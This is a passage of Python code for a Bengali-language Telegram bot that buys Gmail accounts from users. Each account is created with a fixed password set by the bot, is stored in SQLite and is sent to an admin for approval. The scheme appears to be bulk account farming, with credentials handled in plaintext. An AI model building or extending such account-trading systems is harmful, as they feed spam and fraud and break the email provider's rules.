        bot.send_message(user_id, "❌ জিমেইল সেল বাতিল করা হয়েছে।", reply_markup=get_main_menu_markup(user_id))
        return

    if "@" not in gmail_input or "." not in gmail_input:
        bot.send_message(user_id, "❌ এটি কোনো বৈধ জিমেইল নয়। অনুগ্রহ করে পুনরায় জিমেইল সেলে গিয়ে সঠিক জিমেইল দিন।", reply_markup=get_main_menu_markup(user_id))
        return
        
    msg = bot.send_message(user_id, f"🔐 জিমেইল: `{gmail_input}`\n\nএবার নিচে বটের সেই ফিক্সড পাসওয়ার্ডটি (`{GMAIL_PASSWORD_REQUIRED}`) টাইপ করে কনফার্ম করুন:", parse_mode="Markdown", reply_markup=get_cancel_markup())
    bot.register_next_step_handler(msg, lambda msg: process_password_step(msg, gmail_input))

def process_password_step(message, gmail_input):
    user_id = message.chat.id
    password_input = message.text
    
    if is_invalid_input(password_input):
        bot.send_message(user_id, "❌ জিমেইল সেল বাতিল করা হয়েছে।", reply_markup=get_main_menu_markup(user_id))
        return
    
    if password_input == GMAIL_PASSWORD_REQUIRED:
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute("INSERT INTO gmail_orders (user_id, gmail, password, status) VALUES (?, ?, ?, 'Pending')", 
                       (user_id, gmail_input, password_input))
        order_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        bot.send_message(user_id, "ধন্যবাদ আপনার জিমেইল সব কিছু ঠিক থাকলে ১২ ঘন্টার মধ্যে চেক করে এপ্রুভ করা হবে।", reply_markup=get_main_menu_markup(user_id))
        
        markup = types.InlineKeyboardMarkup()
        btn_approve = types.InlineKeyboardButton("✅ Approve", callback_data=f"ga_{order_id}")
        btn_reject = types.InlineKeyboardButton("❌ Reject", callback_data=f"gr_{order_id}")
        markup.row(btn_approve, btn_reject)
        
        admin_msg = (
            f"📨 **নতুন জিমেইল সেল নোটিফিকেশন!**\n\n"
            f"👤 ইউজার আইডি: `{user_id}`\n"
            f"📧 জিমেইল: `{gmail_input}`\n"
            f"🔑 পাসওয়ার্ড: `{password_input}`\n\n"
            f"সঠিক হলে নিচের تبدی বাটনে চাপ দিয়ে এপ্রুভ করুন:"
        )
        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown", reply_markup=markup)
    else:
        bot.send_message(user_id, f"❌ **ভুল পাসওয়ার্ড!** জিমেইল সেল বাতিল করা হয়েছে।", reply_markup=get_main_menu_markup(user_id))

if __name__ == "__main__":
    server_thread = Thread(target=run_web_server)
    server_thread.daemon = True
    server_thread.start()
    
    print("Father of Earn বট এবং ব্যাকগ্রাউন্ড ওয়েব সার্ভার সফলভাবে চালু হয়েছে...")
    
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Error occurred: {e}")
            time.sleep(5)
